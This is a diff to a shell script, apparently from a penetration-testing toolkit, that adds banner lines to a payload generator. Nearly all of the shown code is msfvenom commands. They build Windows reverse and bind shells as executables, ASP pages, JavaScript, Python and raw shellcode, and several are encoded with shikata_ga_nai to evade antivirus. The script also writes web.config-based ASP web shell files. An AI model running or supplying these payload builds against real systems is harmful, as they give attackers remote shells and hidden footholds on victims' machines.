@@ -13,44 +13,57 @@ cd public/payloads_windows
 
    if [ ! -f shell_reverse_tcp_x86.exe ] || confirm "Regenerate payloads_windows [y/n]? " ; then
       # Reverse shells
+      banner "payloads_windows: shell_reverse_tcp_*.exe"
       msfvenom -p windows/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f exe -o shell_reverse_tcp_x86.exe
       msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f exe -o shell_reverse_tcp_x64.exe
 
+      banner "payloads_windows: shell_reverse_tcp_*_shikata_ga_nai.exe"
       msfvenom -p windows/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f exe -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.exe
       msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f exe -e x86/shikata_ga_nai -o shell_reverse_tcp_x64_shikata_ga_nai.exe
 
+      banner "payloads_windows: shell_reverse_tcp_*.asp"
       msfvenom -p windows/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f asp > shell_reverse_tcp_x86.asp
       msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f asp > shell_reverse_tcp_x64.asp
 
+      banner "payloads_windows: shell_reverse_tcp_*.js_le"
       msfvenom -p windows/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f js_le > shell_reverse_tcp_x86.js_le
       msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f js_le > shell_reverse_tcp_x64.js_le
 
+      banner "payloads_windows: shell_reverse_tcp_*.python"
       msfvenom -p windows/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f python > shell_reverse_tcp_x86.python
       msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f python > shell_reverse_tcp_x64.python
 
+      banner "payloads_windows: shell_reverse_tcp_*_shikata_ga_nai.bin"
       msfvenom -p windows/shell_reverse_tcp LPORT=$port_local LHOST=$ip_local EXITFUNC=thread --format raw -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.bin
       msfvenom -p windows/x64/shell_reverse_tcp LPORT=$port_local LHOST=$ip_local EXITFUNC=thread --format raw -o shell_reverse_tcp_x64_shikata_ga_nai.bin    
          
       # Bind shells
+      banner "payloads_windows: shell_reverse_tcp_*.exe"
       msfvenom -p windows/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f exe -o shell_bind_tcp_x86.exe
       msfvenom -p windows/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f exe -o shell_bind_tcp_x64.exe
 
+      banner "payloads_windows: shell_bind_tcp_*_shikata_ga_nai.exe"
       msfvenom -p windows/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f exe -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.exe
       msfvenom -p windows/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f exe -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.exe
 
+      banner "payloads_windows: shell_bind_tcp_*.asp"
       msfvenom -p windows/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f asp > shell_bind_tcp_x86.asp
       msfvenom -p windows/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f asp > shell_bind_tcp_x64.asp
 
+      banner "payloads_windows: shell_bind_tcp_*.js_le"
       msfvenom -p windows/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f js_le > shell_bind_tcp_x86.js_le
       msfvenom -p windows/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f js_le > shell_bind_tcp_x64.js_le
 
+      banner "payloads_windows: shell_bind_tcp_*.python"
       msfvenom -p windows/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f python > shell_bind_tcp_x86.python
       msfvenom -p windows/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f python > shell_bind_tcp_x64.python
 
+      banner "payloads_windows: shell_bind_tcp_*_shikata_ga_nai.bin"
       msfvenom -p windows/shell_bind_tcp LPORT=$port_remote --format raw -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.bin
       msfvenom -p windows/x64/shell_bind_tcp LPORT=$port_remote --format raw -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.bin
 
 
+banner "payloads_windows: asptest.asp.config"
 cat <<\EOT >asptest.asp.config
 <?xml version="1.0" encoding="UTF-8"?>
 <configuration>
@@ -80,6 +93,7 @@ Response.write("<!-"&"-")
 -->
 EOT
 
+banner "payloads_windows: aspcmd.asp.config"
 cat <<\EOT >aspcmd.asp.config
 <?xml version="1.0" encoding="UTF-8"?>
 <configuration>
@@ -152,7 +166,7 @@ Response.Write(thisDir)
 -->
 EOT
 
-
+banner "payloads_windows: asppower.asp.config"
 cat <<\EOT >asppower.asp.config
 <?xml version="1.0" encoding="UTF-8"?>
 <configuration>
